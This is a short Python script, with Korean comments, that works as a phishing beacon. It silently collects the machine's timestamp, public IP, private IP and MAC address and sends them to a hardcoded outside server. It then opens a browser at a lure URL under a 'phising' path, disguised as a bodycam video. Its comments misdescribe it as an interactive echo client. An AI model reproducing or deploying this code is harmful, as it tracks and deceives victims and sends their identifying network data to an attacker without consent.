from datetime import datetime
from requests import get #공인 ip를 가져오기 위힘
import socket #사설 ip를 가져오기 위함
import getmac #MAC주소 가져오기 위함
import webbrowser

HOST = '155.230.52.54'
PORT = 3307

client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client_socket.connect((HOST, PORT))

# 키보드로 입력한 문자열을 서버로 전송하고
# 서버에서 에코되어 돌아오는 메시지를 받으면 화면에 출력합니다.
# quit를 입력할 때 까지 반복합니다.
current_time = datetime.now()
public_ip = get("https://api.ipify.org").text
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(('8.8.8.8', 80))
private_ip = s.getsockname()[0]
s.close()

message = str(current_time) + " " + public_ip + " " + private_ip + " " + getmac.get_mac_address()

client_socket.send(message.encode())

client_socket.close()


url = 'http://155.230.52.54:8080/ksj/phising/exe_bodycam_video.mp4'

webbrowser.open(url)